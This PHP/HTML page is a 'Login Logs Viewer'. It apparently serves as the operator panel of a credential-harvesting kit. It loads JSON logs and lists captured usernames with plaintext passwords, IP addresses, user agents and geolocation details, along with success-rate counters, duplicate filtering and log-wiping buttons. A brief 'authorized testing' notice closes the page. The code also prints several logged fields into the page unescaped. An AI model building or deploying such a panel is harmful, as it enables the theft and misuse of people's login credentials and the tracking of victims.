<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Logs Viewer</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h1, h2 {
            color: #333;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat-box {
            background: #007bff;
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            flex: 1;
        }
        .stat-box.success {
            background: #28a745;
        }
        .stat-box.failed {
            background: #dc3545;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-bottom: 30px;
        }
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #f8f9fa;
            font-weight: bold;
        }
        .success-row {
            background-color: #d4edda;
        }
        .failed-row {
            background-color: #f8d7da;
        }
        .detail-row td {background:#f1f1f1;font-size:0.9em}
        .toggle-row {cursor:pointer}
        .refresh-btn {
            background: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 20px;
        }
        .refresh-btn:hover {
            background: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Login Logs Viewer</h1>
        
        <?php
        // Determine whether duplicate filtering is active
        $hideDuplicates = isset($_GET['unique']) && $_GET['unique'] === '1';
        $queryBase      = strtok($_SERVER['REQUEST_URI'], '?'); // path sans query
        ?>

        <button class="refresh-btn" onclick="location.href='<?php echo htmlspecialchars($queryBase); ?>'">🔄 Refresh</button>
        <button class="refresh-btn" style="background:#dc3545" onclick="window.location='<?php echo htmlspecialchars($queryBase); ?>?clear=failed'">🗑️ Clear Failed</button>
        <button class="refresh-btn" style="background:#6c757d" onclick="if(confirm('⚠️  This will remove ALL logs (attempts and successes). Continue?')){window.location='<?php echo htmlspecialchars($queryBase); ?>?clear=all';}">🗑️🗑️ Clear ALL</button>
        <?php if ($hideDuplicates): ?>
            <button class="refresh-btn" style="background:#17a2b8" onclick="window.location='<?php echo htmlspecialchars($queryBase); ?>'">👁️‍🗨️ Show Duplicates</button>
        <?php else: ?>
            <button class="refresh-btn" style="background:#17a2b8" onclick="window.location='<?php echo htmlspecialchars($queryBase); ?>?unique=1'">🚮 Hide Duplicates</button>
        <?php endif; ?>
        
        <?php
        if (isset($_GET['clear'])) {
            $action = $_GET['clear'];
            $attemptsPath = __DIR__ . '/../logs/attempts.json';
            $successPath  = __DIR__ . '/../logs/successful_logins.json';

            if ($action === 'failed') {
                if (file_exists($attemptsPath)) {
                    $all = json_decode(file_get_contents($attemptsPath), true) ?: [];
                    // keep only successes
                    $all = array_values(array_filter($all, fn($row) => !empty($row['success'])));
                    file_put_contents($attemptsPath, json_encode($all, JSON_PRETTY_PRINT));
                }
            } elseif ($action === 'all') {
                // wipe both files
                file_put_contents($attemptsPath, json_encode([], JSON_PRETTY_PRINT));
                file_put_contents($successPath,  json_encode([], JSON_PRETTY_PRINT));
            }

            // redirect back without query param to refresh counters
            header('Location: view_logs.php');
            exit;
        }
        
        // Load attempts log
        $attemptsFile = '../logs/attempts.json';
        $successFile = '../logs/successful_logins.json';
        
        $attempts = [];
        $successes = [];
        
        if (file_exists($attemptsFile)) {
            $attempts = json_decode(file_get_contents($attemptsFile), true) ?: [];
        }
        
        if (file_exists($successFile)) {
            $successes = json_decode(file_get_contents($successFile), true) ?: [];
        }
        
        $totalAttempts = count($attempts);
        $successfulAttempts = count($successes);
        $failedAttempts = $totalAttempts - $successfulAttempts;
        $successRate = $totalAttempts > 0 ? round(($successfulAttempts / $totalAttempts) * 100, 2) : 0;
        ?>
        
        <div class="stats">
            <div class="stat-box">
                <h3><?php echo $totalAttempts; ?></h3>
                <p>Total Attempts</p>
            </div>
            <div class="stat-box success">
                <h3><?php echo $successfulAttempts; ?></h3>
                <p>Successful Logins</p>
            </div>
            <div class="stat-box failed">
                <h3><?php echo $failedAttempts; ?></h3>
                <p>Failed Attempts</p>
            </div>
            <div class="stat-box">
                <h3><?php echo $successRate; ?>%</h3>
                <p>Success Rate</p>
            </div>
        </div>
        
        <h2>📊 All Login Attempts</h2>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Status</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // Sort attempts by timestamp (newest first)
                usort($attempts, function($a, $b) {
                    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
                });
                
                // Apply duplicate filter if enabled
                $idx = 0;
                $seenKeys = [];
                foreach ($attempts as $attempt) {
                    if ($hideDuplicates) {
                        $key = $attempt['username'].'|'.$attempt['password'];
                        if (isset($seenKeys[$key])) continue;
                        $seenKeys[$key] = true;
                    }

                    $idx++;
                    $rowClass = $attempt['success'] ? 'success-row' : 'failed-row';
                    $status = $attempt['success'] ? '✅ Success' : '❌ Failed';
                    echo "<tr class='{$rowClass} toggle-row' data-target='detail-{$idx}'>";
                    echo "<td>" . htmlspecialchars($attempt['timestamp']) . "</td>";
                    echo "<td>" . htmlspecialchars($attempt['username']) . "</td>";
                    echo "<td>" . htmlspecialchars($attempt['password']) . "</td>";
                    echo "<td>{$status}</td>";
                    echo "<td>" . htmlspecialchars($attempt['ip_address']) . "</td>";
                    echo "<td>Click to expand</td>";
                    echo "</tr>";

                    // details row
                    $ua = htmlspecialchars($attempt['user_agent']);
                    $extras = [
                      'OS'        => $attempt['os']    ?? '',
                      'Browser'   => $attempt['browser'] ?? '',
                      'Country'   => $attempt['country'] ?? '',
                      'Region'    => $attempt['region'] ?? '',
                      'City'      => $attempt['city'] ?? '',
                      'Timezone'  => $attempt['tz'] ?? '',
                      'Screen'    => $attempt['screen'] ?? '',
                      'Lang'      => $attempt['lang'] ?? ''
                    ];
                    $detailHtml = "<strong>Full User-Agent:</strong> {$ua}<br><strong>IP Address:</strong> " . htmlspecialchars($attempt['ip_address']);
                    foreach($extras as $label=>$val){
                        if($val!=='') $detailHtml .= "<br><strong>{$label}:</strong> ".$val;
                    }
                    echo "<tr id='detail-{$idx}' class='detail-row' style='display:none'><td colspan='6'>{$detailHtml}</td></tr>";
                }
                
                if (empty($attempts)) {
                    echo "<tr><td colspan='6' style='text-align: center; color: #666;'>No login attempts recorded yet.</td></tr>";
                }
                ?>
            </tbody>
        </table>
        
        <h2>🎯 Successful Logins Only</h2>
        <table>
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>IP Address</th>
                    <th>User Agent</th>
                </tr>
            </thead>
            <tbody>
                <?php
                // Sort successes by timestamp (newest first)
                usort($successes, function($a, $b) {
                    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
                });
                
                $seenKeysSucc = [];
                foreach ($successes as $success) {
                    if ($hideDuplicates) {
                        $key = $success['username'].'|'.$success['password'];
                        if (isset($seenKeysSucc[$key])) continue;
                        $seenKeysSucc[$key] = true;
                    }

                    echo "<tr class='success-row'>";
                    echo "<td>" . htmlspecialchars($success['timestamp']) . "</td>";
                    echo "<td>" . htmlspecialchars($success['username']) . "</td>";
                    echo "<td>" . htmlspecialchars($success['password']) . "</td>";
                    echo "<td>" . htmlspecialchars($success['ip_address']) . "</td>";
                    echo "<td>" . htmlspecialchars(substr($success['user_agent'], 0, 50)) . "...</td>";
                    echo "</tr>";
                }
                
                if (empty($successes)) {
                    echo "<tr><td colspan='5' style='text-align: center; color: #666;'>No successful logins recorded yet.</td></tr>";
                }
                ?>
            </tbody>
        </table>
        
        <div style="margin-top: 30px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 4px;">
            <strong>⚠️ Security Notice:</strong> This tool is for educational and authorized testing purposes only. 
            Ensure you have proper authorization before using this on any system.
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded',()=>{
      document.querySelectorAll('.toggle-row').forEach(r=>{
        r.addEventListener('click',()=>{
          const target=document.getElementById(r.dataset.target);
          if(target) target.style.display=target.style.display==='none'?'table-row':'none';
        });
      });
    });
    </script>
</body>
</html> 